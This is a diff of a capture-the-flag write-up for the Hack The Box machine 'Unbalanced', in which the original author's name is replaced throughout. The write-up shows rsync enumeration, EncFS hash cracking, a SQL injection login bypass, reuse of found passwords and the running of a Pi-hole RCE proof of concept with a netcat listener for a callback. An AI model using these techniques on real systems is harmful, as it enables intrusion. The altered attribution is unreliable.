@@ -9,6 +9,7 @@ avatar: assets/htb/unbalanced.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Unbalanced
 ---
+
 ## Overview
 
 TODO: finish writing and do cleanup
@@ -20,7 +21,7 @@ TODO: finish writing and do cleanup
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ nmap -p- -sCV -n -v -oA unbalanced <YOUR_IP>
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-13 20:15 EST
 NSE: Loaded 153 scripts for scanning.
@@ -79,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 55.27 seconds
 
 three ports open, 22-SSH, 873 - Rsync, and 3128 which was identfied as an HTTP Squid proxy
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-squid.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-squid.png)
 
 [https://en.wikipedia.org/wiki/Rsync](https://en.wikipedia.org/wiki/Rsync)
 
@@ -92,7 +93,7 @@ three ports open, 22-SSH, 873 - Rsync, and 3128 which was identfied as an HTTP S
 found an article on pentesting port 873 - rsync - [https://book.hacktricks.xyz/pentesting/873-pentesting-rsync](https://book.hacktricks.xyz/pentesting/873-pentesting-rsync)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ nc -vn <YOUR_IP> 873
 (UNKNOWN) [<YOUR_IP>] 873 (rsync) open
 @RSYNCD: 31.0
@@ -105,7 +106,7 @@ conf_backups    EncFS-encrypted configuration backups
 apparently this machine had some EncFS-encrypted configuration backups enabled
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ rsync -av rsync://<YOUR_IP>:873/conf_backups ./conf_backups                                 1 ⨯
 receiving incremental file list
 created directory ./conf_backups
@@ -193,10 +194,10 @@ total size is 405,603  speedup is 0.98
 I pulled the files to my machine using `rsync`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/conf_backups]
+┌──(kac0㉿kali)-[~/htb/unbalanced/conf_backups]
 └─$ ls -l | base64 -d > files
 base64: invalid input
-┌──(zweilos㉿kali)-[~/htb/unbalanced/conf_backups]
+┌──(kac0㉿kali)-[~/htb/unbalanced/conf_backups]
 └─$ cat .encfs6.xml
 ```
 
@@ -245,31 +246,31 @@ mRdqbk2WwLMrrZ1P6z2OQlFl8QU=
 This XML file gave me all the information I needed to decrypt the files, except one thing...
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ encfs /home/zweilos/htb/unbalanced/conf_backups /home/zweilos/htb/unbalanced/decrypted         1 ⨯
+┌──(kac0㉿kali)-[~/htb/unbalanced]
+└─$ encfs /home/kac0/htb/unbalanced/conf_backups /home/kac0/htb/unbalanced/decrypted         1 ⨯
 EncFS Password: 
 Error decoding volume key, password incorrect
 ```
 
 I installed `encfs` and attempted to decrypt the data, but I found out I needed a password. While searching for how to crack the key from the .encfs6.xml file, I found [https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml](https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml) which led me to discover another "X2john" command that I didnt know: `encfs2john`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-encfs.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-encfs.png)
 
 While installing, got this warning 
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ /usr/share/john/encfs2john.py conf_backups/.encfs6.xml > encfshash
 conf_backups/.encfs6.xml doesn't have .encfs6.xml!
 
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ /usr/share/john/encfs2john.py conf_backups/ > encfshash
 ```
 
 I found that the `encfs2john` program must be run on a directory, rather than a single file by itself. Using this script I was able to get a hash
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt encfshash                                   127 ⨯
 Using default input encoding: UTF-8
 Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
@@ -285,101 +286,101 @@ Session completed
 Using john I was able to quickly crack the hash and discovered the password was...`bubblegum`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
-└─$ encfs /home/zweilos/htb/unbalanced/conf_backups /home/zweilos/htb/unbalanced/decrypted
+┌──(kac0㉿kali)-[~/htb/unbalanced]
+└─$ encfs /home/kac0/htb/unbalanced/conf_backups /home/kac0/htb/unbalanced/decrypted
 EncFS Password:
 ```
 
 I used the `encfs` program to extract the encrypted files from `conf_backups` to a folder.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ cd decrypted 
 
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ ls -la                   
 total 628
-drwxr-xr-x 2 zweilos zweilos   4096 Nov 14 13:44 .
-drwxr-xr-x 4 zweilos zweilos   4096 Nov 14 14:01 ..
--rw-r--r-- 1 zweilos zweilos    267 Apr  4  2020 50-localauthority.conf
--rw-r--r-- 1 zweilos zweilos    455 Apr  4  2020 50-nullbackend.conf
--rw-r--r-- 1 zweilos zweilos     48 Apr  4  2020 51-debian-sudo.conf
--rw-r--r-- 1 zweilos zweilos    182 Apr  4  2020 70debconf
--rw-r--r-- 1 zweilos zweilos   2351 Apr  4  2020 99-sysctl.conf
--rw-r--r-- 1 zweilos zweilos   4564 Apr  4  2020 access.conf
--rw-r--r-- 1 zweilos zweilos   2981 Apr  4  2020 adduser.conf
--rw-r--r-- 1 zweilos zweilos   1456 Apr  4  2020 bluetooth.conf
--rw-r--r-- 1 zweilos zweilos   5713 Apr  4  2020 ca-certificates.conf
--rw-r--r-- 1 zweilos zweilos    662 Apr  4  2020 com.ubuntu.SoftwareProperties.conf
--rw-r--r-- 1 zweilos zweilos    246 Apr  4  2020 dconf
--rw-r--r-- 1 zweilos zweilos   2969 Apr  4  2020 debconf.conf
--rw-r--r-- 1 zweilos zweilos    230 Apr  4  2020 debian.conf
--rw-r--r-- 1 zweilos zweilos    604 Apr  4  2020 deluser.conf
--rw-r--r-- 1 zweilos zweilos   1735 Apr  4  2020 dhclient.conf
--rw-r--r-- 1 zweilos zweilos    346 Apr  4  2020 discover-modprobe.conf
--rw-r--r-- 1 zweilos zweilos    127 Apr  4  2020 dkms.conf
--rw-r--r-- 1 zweilos zweilos     21 Apr  4  2020 dns.conf
--rw-r--r-- 1 zweilos zweilos    652 Apr  4  2020 dnsmasq.conf
--rw-r--r-- 1 zweilos zweilos   1875 Apr  4  2020 docker.conf
--rw-r--r-- 1 zweilos zweilos     38 Apr  4  2020 fakeroot-x86_64-linux-gnu.conf
--rw-r--r-- 1 zweilos zweilos    906 Apr  4  2020 framework.conf
--rw-r--r-- 1 zweilos zweilos    280 Apr  4  2020 fuse.conf
--rw-r--r-- 1 zweilos zweilos   2584 Apr  4  2020 gai.conf
--rw-r--r-- 1 zweilos zweilos   3635 Apr  4  2020 group.conf
--rw-r--r-- 1 zweilos zweilos   5060 Apr  4  2020 hdparm.conf
--rw-r--r-- 1 zweilos zweilos      9 Apr  4  2020 host.conf
--rw-r--r-- 1 zweilos zweilos   1269 Apr  4  2020 initramfs.conf
--rw-r--r-- 1 zweilos zweilos    927 Apr  4  2020 input.conf
--rw-r--r-- 1 zweilos zweilos   1042 Apr  4  2020 journald.conf
--rw-r--r-- 1 zweilos zweilos    144 Apr  4  2020 kernel-img.conf
--rw-r--r-- 1 zweilos zweilos    332 Apr  4  2020 ldap.conf
--rw-r--r-- 1 zweilos zweilos     34 Apr  4  2020 ld.so.conf
--rw-r--r-- 1 zweilos zweilos    191 Apr  4  2020 libaudit.conf
--rw-r--r-- 1 zweilos zweilos     44 Apr  4  2020 libc.conf
--rw-r--r-- 1 zweilos zweilos   2161 Apr  4  2020 limits.conf
--rw-r--r-- 1 zweilos zweilos    150 Apr  4  2020 listchanges.conf
--rw-r--r-- 1 zweilos zweilos   1042 Apr  4  2020 logind.conf
--rw-r--r-- 1 zweilos zweilos    435 Apr  4  2020 logrotate.conf
--rw-r--r-- 1 zweilos zweilos   4491 Apr  4  2020 main.conf
--rw-r--r-- 1 zweilos zweilos    812 Apr  4  2020 mke2fs.conf
--rw-r--r-- 1 zweilos zweilos    195 Apr  4  2020 modules.conf
--rw-r--r-- 1 zweilos zweilos   1440 Apr  4  2020 namespace.conf
--rw-r--r-- 1 zweilos zweilos    120 Apr  4  2020 network.conf
--rw-r--r-- 1 zweilos zweilos    529 Apr  4  2020 networkd.conf
--rw-r--r-- 1 zweilos zweilos    510 Apr  4  2020 nsswitch.conf
--rw-r--r-- 1 zweilos zweilos   1331 Apr  4  2020 org.freedesktop.PackageKit.conf
--rw-r--r-- 1 zweilos zweilos    706 Apr  4  2020 PackageKit.conf
--rw-r--r-- 1 zweilos zweilos    552 Apr  4  2020 pam.conf
--rw-r--r-- 1 zweilos zweilos   2972 Apr  4  2020 pam_env.conf
--rw-r--r-- 1 zweilos zweilos   1583 Apr  4  2020 parser.conf
--rw-r--r-- 1 zweilos zweilos    324 Apr  4  2020 protect-links.conf
--rw-r--r-- 1 zweilos zweilos   3267 Apr  4  2020 reportbug.conf
--rw-r--r-- 1 zweilos zweilos     87 Apr  4  2020 resolv.conf
--rw-r--r-- 1 zweilos zweilos    649 Apr  4  2020 resolved.conf
--rw-r--r-- 1 zweilos zweilos    146 Apr  4  2020 rsyncd.conf
--rw-r--r-- 1 zweilos zweilos   1988 Apr  4  2020 rsyslog.conf
--rw-r--r-- 1 zweilos zweilos   2041 Apr  4  2020 semanage.conf
--rw-r--r-- 1 zweilos zweilos    419 Apr  4  2020 sepermit.conf
--rw-r--r-- 1 zweilos zweilos    790 Apr  4  2020 sleep.conf
--rw-r--r-- 1 zweilos zweilos 316553 Apr  4  2020 squid.conf
--rw-r--r-- 1 zweilos zweilos   2351 Apr  4  2020 sysctl.conf
--rw-r--r-- 1 zweilos zweilos   1628 Apr  4  2020 system.conf
--rw-r--r-- 1 zweilos zweilos   2179 Apr  4  2020 time.conf
--rw-r--r-- 1 zweilos zweilos    677 Apr  4  2020 timesyncd.conf
--rw-r--r-- 1 zweilos zweilos   1260 Apr  4  2020 ucf.conf
--rw-r--r-- 1 zweilos zweilos    281 Apr  4  2020 udev.conf
--rw-r--r-- 1 zweilos zweilos    378 Apr  4  2020 update-initramfs.conf
--rw-r--r-- 1 zweilos zweilos   1130 Apr  4  2020 user.conf
--rw-r--r-- 1 zweilos zweilos    414 Apr  4  2020 user-dirs.conf
--rw-r--r-- 1 zweilos zweilos   1889 Apr  4  2020 Vendor.conf
--rw-r--r-- 1 zweilos zweilos   1513 Apr  4  2020 wpa_supplicant.conf
--rw-r--r-- 1 zweilos zweilos    100 Apr  4  2020 x86_64-linux-gnu.conf
--rw-r--r-- 1 zweilos zweilos    642 Apr  4  2020 xattr.conf
+drwxr-xr-x 2 kac0 kac0   4096 Nov 14 13:44 .
+drwxr-xr-x 4 kac0 kac0   4096 Nov 14 14:01 ..
+-rw-r--r-- 1 kac0 kac0    267 Apr  4  2020 50-localauthority.conf
+-rw-r--r-- 1 kac0 kac0    455 Apr  4  2020 50-nullbackend.conf
+-rw-r--r-- 1 kac0 kac0     48 Apr  4  2020 51-debian-sudo.conf
+-rw-r--r-- 1 kac0 kac0    182 Apr  4  2020 70debconf
+-rw-r--r-- 1 kac0 kac0   2351 Apr  4  2020 99-sysctl.conf
+-rw-r--r-- 1 kac0 kac0   4564 Apr  4  2020 access.conf
+-rw-r--r-- 1 kac0 kac0   2981 Apr  4  2020 adduser.conf
+-rw-r--r-- 1 kac0 kac0   1456 Apr  4  2020 bluetooth.conf
+-rw-r--r-- 1 kac0 kac0   5713 Apr  4  2020 ca-certificates.conf
+-rw-r--r-- 1 kac0 kac0    662 Apr  4  2020 com.ubuntu.SoftwareProperties.conf
+-rw-r--r-- 1 kac0 kac0    246 Apr  4  2020 dconf
+-rw-r--r-- 1 kac0 kac0   2969 Apr  4  2020 debconf.conf
+-rw-r--r-- 1 kac0 kac0    230 Apr  4  2020 debian.conf
+-rw-r--r-- 1 kac0 kac0    604 Apr  4  2020 deluser.conf
+-rw-r--r-- 1 kac0 kac0   1735 Apr  4  2020 dhclient.conf
+-rw-r--r-- 1 kac0 kac0    346 Apr  4  2020 discover-modprobe.conf
+-rw-r--r-- 1 kac0 kac0    127 Apr  4  2020 dkms.conf
+-rw-r--r-- 1 kac0 kac0     21 Apr  4  2020 dns.conf
+-rw-r--r-- 1 kac0 kac0    652 Apr  4  2020 dnsmasq.conf
+-rw-r--r-- 1 kac0 kac0   1875 Apr  4  2020 docker.conf
+-rw-r--r-- 1 kac0 kac0     38 Apr  4  2020 fakeroot-x86_64-linux-gnu.conf
+-rw-r--r-- 1 kac0 kac0    906 Apr  4  2020 framework.conf
+-rw-r--r-- 1 kac0 kac0    280 Apr  4  2020 fuse.conf
+-rw-r--r-- 1 kac0 kac0   2584 Apr  4  2020 gai.conf
+-rw-r--r-- 1 kac0 kac0   3635 Apr  4  2020 group.conf
+-rw-r--r-- 1 kac0 kac0   5060 Apr  4  2020 hdparm.conf
+-rw-r--r-- 1 kac0 kac0      9 Apr  4  2020 host.conf
+-rw-r--r-- 1 kac0 kac0   1269 Apr  4  2020 initramfs.conf
+-rw-r--r-- 1 kac0 kac0    927 Apr  4  2020 input.conf
+-rw-r--r-- 1 kac0 kac0   1042 Apr  4  2020 journald.conf
+-rw-r--r-- 1 kac0 kac0    144 Apr  4  2020 kernel-img.conf
+-rw-r--r-- 1 kac0 kac0    332 Apr  4  2020 ldap.conf
+-rw-r--r-- 1 kac0 kac0     34 Apr  4  2020 ld.so.conf
+-rw-r--r-- 1 kac0 kac0    191 Apr  4  2020 libaudit.conf
+-rw-r--r-- 1 kac0 kac0     44 Apr  4  2020 libc.conf
+-rw-r--r-- 1 kac0 kac0   2161 Apr  4  2020 limits.conf
+-rw-r--r-- 1 kac0 kac0    150 Apr  4  2020 listchanges.conf
+-rw-r--r-- 1 kac0 kac0   1042 Apr  4  2020 logind.conf
+-rw-r--r-- 1 kac0 kac0    435 Apr  4  2020 logrotate.conf
+-rw-r--r-- 1 kac0 kac0   4491 Apr  4  2020 main.conf
+-rw-r--r-- 1 kac0 kac0    812 Apr  4  2020 mke2fs.conf
+-rw-r--r-- 1 kac0 kac0    195 Apr  4  2020 modules.conf
+-rw-r--r-- 1 kac0 kac0   1440 Apr  4  2020 namespace.conf
+-rw-r--r-- 1 kac0 kac0    120 Apr  4  2020 network.conf
+-rw-r--r-- 1 kac0 kac0    529 Apr  4  2020 networkd.conf
+-rw-r--r-- 1 kac0 kac0    510 Apr  4  2020 nsswitch.conf
+-rw-r--r-- 1 kac0 kac0   1331 Apr  4  2020 org.freedesktop.PackageKit.conf
+-rw-r--r-- 1 kac0 kac0    706 Apr  4  2020 PackageKit.conf
+-rw-r--r-- 1 kac0 kac0    552 Apr  4  2020 pam.conf
+-rw-r--r-- 1 kac0 kac0   2972 Apr  4  2020 pam_env.conf
+-rw-r--r-- 1 kac0 kac0   1583 Apr  4  2020 parser.conf
+-rw-r--r-- 1 kac0 kac0    324 Apr  4  2020 protect-links.conf
+-rw-r--r-- 1 kac0 kac0   3267 Apr  4  2020 reportbug.conf
+-rw-r--r-- 1 kac0 kac0     87 Apr  4  2020 resolv.conf
+-rw-r--r-- 1 kac0 kac0    649 Apr  4  2020 resolved.conf
+-rw-r--r-- 1 kac0 kac0    146 Apr  4  2020 rsyncd.conf
+-rw-r--r-- 1 kac0 kac0   1988 Apr  4  2020 rsyslog.conf
+-rw-r--r-- 1 kac0 kac0   2041 Apr  4  2020 semanage.conf
+-rw-r--r-- 1 kac0 kac0    419 Apr  4  2020 sepermit.conf
+-rw-r--r-- 1 kac0 kac0    790 Apr  4  2020 sleep.conf
+-rw-r--r-- 1 kac0 kac0 316553 Apr  4  2020 squid.conf
+-rw-r--r-- 1 kac0 kac0   2351 Apr  4  2020 sysctl.conf
+-rw-r--r-- 1 kac0 kac0   1628 Apr  4  2020 system.conf
+-rw-r--r-- 1 kac0 kac0   2179 Apr  4  2020 time.conf
+-rw-r--r-- 1 kac0 kac0    677 Apr  4  2020 timesyncd.conf
+-rw-r--r-- 1 kac0 kac0   1260 Apr  4  2020 ucf.conf
+-rw-r--r-- 1 kac0 kac0    281 Apr  4  2020 udev.conf
+-rw-r--r-- 1 kac0 kac0    378 Apr  4  2020 update-initramfs.conf
+-rw-r--r-- 1 kac0 kac0   1130 Apr  4  2020 user.conf
+-rw-r--r-- 1 kac0 kac0    414 Apr  4  2020 user-dirs.conf
+-rw-r--r-- 1 kac0 kac0   1889 Apr  4  2020 Vendor.conf
+-rw-r--r-- 1 kac0 kac0   1513 Apr  4  2020 wpa_supplicant.conf
+-rw-r--r-- 1 kac0 kac0    100 Apr  4  2020 x86_64-linux-gnu.conf
+-rw-r--r-- 1 kac0 kac0    642 Apr  4  2020 xattr.conf
 ```
 
 It turned out that this folder contained backups of all of the configuration files for the system. There should be lots of juicy information here!
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-squid-conf-acl.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-squid-conf-acl.png)
 
 ```text
 #Default:
@@ -495,7 +496,7 @@ cachemgr_passwd disable all
 there was a password of `Thah$Sh1` which enabled a lot of the actions
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ nikto -host 127.0.0.1 -useproxy http://<YOUR_IP>:3128                                     130 ⨯
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -533,7 +534,7 @@ there was a password of `Thah$Sh1` which enabled a lot of the actions
 I ran nikto to see if there were any vulnerabilities, it reported a few different backdoors, but must have been showing false positives since none of these existed.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb
 *   Trying <YOUR_IP>:3128...
 * Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
@@ -559,12 +560,12 @@ I ran nikto to see if there were any vulnerabilities, it reported a few differen
 * Connection #0 to host <YOUR_IP> left intact
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-unbalanced-intranet%2520%25281%2529%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-unbalanced-intranet%2520%25281%2529%2520%25281%2529.png)
 
 while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-host3.unbalanced.htb` to hosts, but was denied.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ curl -v -x http://<YOUR_IP>:3128 http://intranet.unbalanced.htb/                       
 *   Trying <YOUR_IP>:3128...
 * Connected to <YOUR_IP> (<YOUR_IP>) port 3128 (#0)
@@ -593,7 +594,7 @@ while trying to connect to `intranet.unbalanced.htb` I saw and added `intranet-h
 noticed that this time the intranet host was was different: this time was `host2`. After testing a few times I only got host 2 and 3.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ dirb http://intranet.unbalanced.htb /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -p <YOUR_IP>:3128 -w
 
 -----------------
@@ -643,7 +644,7 @@ cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects 
 ```
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -h <YOUR_IP> -p 3128 http://intranet-host2.unbalanced.htb mgr:menu
 HTTP/1.1 401 Unauthorized
 Server: squid/4.6
@@ -682,7 +683,7 @@ Connection: close
 I was on the right track, now I just needed to figure out how to authenticate with the password I had found. The man page showed me that the `-w $password` would allow me to authenticate the proxy
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:menu
 HTTP/1.1 200 OK
 Server: squid/4.6
@@ -754,7 +755,7 @@ Connection: close
 `menu` got me a list of all of the info types I gould enumerate, though only a handful of them weren't disabled, and all of those were protected \(required authentication\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:pconn
 HTTP/1.1 200 OK
 Server: squid/4.6
@@ -780,16 +781,16 @@ server-peers persistent connection counts:
 
 it looked like intranet.unbalanced.htb resolved internally to a different address than I thought. It was pointed towards `172.17.0.1`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-squid-config.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-squid-config.png)
 
 I put this address in my \(proxied\) browser, and it navigated to the same page!
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-172-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-172-test.png)
 
 `mem` and `diskd` did not return anything useful, but `fqdncache` gave me some interesting internal information
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:fqdncache
 HTTP/1.1 200 OK
 Server: squid/4.6
@@ -830,12 +831,12 @@ There were the IPs for the intranet-host 2 and 3 I had seen earlier. There didnt
 
 pic
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-host1-load-balance.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-host1-load-balance.png)
 
 Taken out of load balancing, but not down? I wondered if there was a way to load it to evaluate this "security maintenance" of theirs
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ squidclient -w 'Thah$Sh1' -h <YOUR_IP> -p 3128 http://intranet.unbalanced.htb mgr:filedescriptors
 HTTP/1.1 200 OK
 Server: squid/4.6
@@ -862,11 +863,11 @@ File Type   Tout Nread  * Nwrite * Remote Address        Description
 
 cache log at `/var/log/squid/cache.log` could be interesting. There was not much interesting in the rest of the available methods
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-host1-intranet.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-host1-intranet.png)
 
 Since each of the other hosts redirected requests for index.php to `intranet.php` I manually typed it in for host1 and it brought up the page. Now I needed to find out what the page was taken down for 'security maintenance'. The page looked pretty much exactly like the others, so I figured the vulnerability must be in the input fields
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-user-enumeration.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-user-enumeration.png)
 
 I entered a standard test for SQL injection `a ' or 'a' = 'a` in both the username and password field and my first try got a list of users. Only the username field was vulnerable to this
 
@@ -927,7 +928,7 @@ pass_brute(userlist)
 For some reason sending the username in the username field caused my SQL injection to not work, however sending it as SQL parameter in the password field worked...strange, but I got it to work
 
 ```text
-┌──(zweilos㉿kali)-[~]
+┌──(kac0㉿kali)-[~]
 └─$ python3 pass_brute.py
 
 Getting password for user: rita
@@ -956,7 +957,7 @@ For some reason I had to strip off extra `'` characters from the passwords. I su
 ### Finding user creds
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced/decrypted]
+┌──(kac0㉿kali)-[~/htb/unbalanced/decrypted]
 └─$ ssh bryan@<YOUR_IP>                                                                         2 ⨯
 The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:aiHhPmnhyt434Qvr9CpJRZOmU7m1R1LI29c11na1obY.
@@ -994,7 +995,7 @@ drwx------ 3 bryan bryan 4096 Apr  2  2020 .gnupg
 -rw-r--r-- 1 bryan bryan  798 Jun 17 11:35 TODO
 -rw-r--r-- 1 root  root    33 Nov 13 09:52 user.txt
 bryan@unbalanced:~$ cat user.txt 
-3634****bc51
+3634************************bc51
 ```
 
 Luckily, this was also the user with the flag!
@@ -1186,7 +1187,7 @@ dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 
 Only `bryan` and `root` are able to login
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/9-dnsmasq%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-dnsmasq%2520%25281%2529.png)
 
 inside `dnsmasq.conf` there was a listen address of 172.31.0.1 - this was the same address I saw for the docker container earlier
 
@@ -1227,7 +1228,7 @@ bryan@unbalanced:/etc$ curl http://172.31.11.3
 
 I was not able to connect to the new address with nc, but there was a page hosted there on port 80 that curl was able to pull. I tried to curl the `/admin` page, but nothing returned
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-pihole.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-pihole.png)
 
 navigated to 172.31.11.3, found a pihole page, clicked on the link to the admin page and found a new vhost at pihole.unbalanced.htb
 
@@ -1237,11 +1238,11 @@ Pi-hole Version v4.3.2 Web Interface Version v4.3 FTL Version v4.3.1
 
 I searched for releases for pi-hole and found that the newest version was 5.1. After that I searched for exploits for 4.3.2 and found a remote command execution vulnerability had been discovered [https://frichetten.com/blog/cve-2020-11108-pihole-rce/](https://frichetten.com/blog/cve-2020-11108-pihole-rce/) and a metasploit module [https://www.exploit-db.com/exploits/48491](https://www.exploit-db.com/exploits/48491)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-unbalanced-pihole-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-unbalanced-pihole-login.png)
 
 Needed a password in order to log into the setting page,
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-wrong-pass.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-wrong-pass.png)
 
 The forgot password link gave some interesting information about setting the password for a `pihole`, but unfortunately it required `sudo` privileges.
 
@@ -1254,20 +1255,20 @@ Got permission denied while trying to connect to the Docker daemon socket at uni
 
 Also did not have pernissions to read the docker logs
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-im-in.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-im-in.png)
 
 tried logging in with admin...and got in! \(Should have tried that first!\). I noticed that the service was running with root privileges
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-pihole-blocklist.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-pihole-blocklist.png)
 
 blocklist
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-pihole-blocklist-update.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-pihole-blocklist-update.png)
 
 blocklist update
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ nc -lvnp 8099                                                                                   1 ⨯
 listening on [any] 8099 ...
 connect to [10.10.15.88] from (UNKNOWN) [<YOUR_IP>] 55154
@@ -1289,7 +1290,7 @@ The first part of the exploit seemed to work, but after the refresh I couldn't g
 [https://github.com/frichetten/CVE-2020-11108-PoC](https://github.com/frichetten/CVE-2020-11108-PoC)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
 └─$ sudo python3 ./root-cve-2020-11108-rce.py prdbr29htat9e3p10o7c7le7h1 http://127.0.0.1 10.10.15.88 12345     
 [+] Put Root Stager Success
 [+] Received First Callback
@@ -1305,7 +1306,7 @@ The first part of the exploit seemed to work, but after the refresh I couldn't g
 running the POC with all of the proper inputs stil did not work. I went looking for another exploit and found [https://github.com/AndreyRainchik/CVE-2020-8816](https://github.com/AndreyRainchik/CVE-2020-8816)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/unbalanced]
+┌──(kac0㉿kali)-[~/htb/unbalanced]
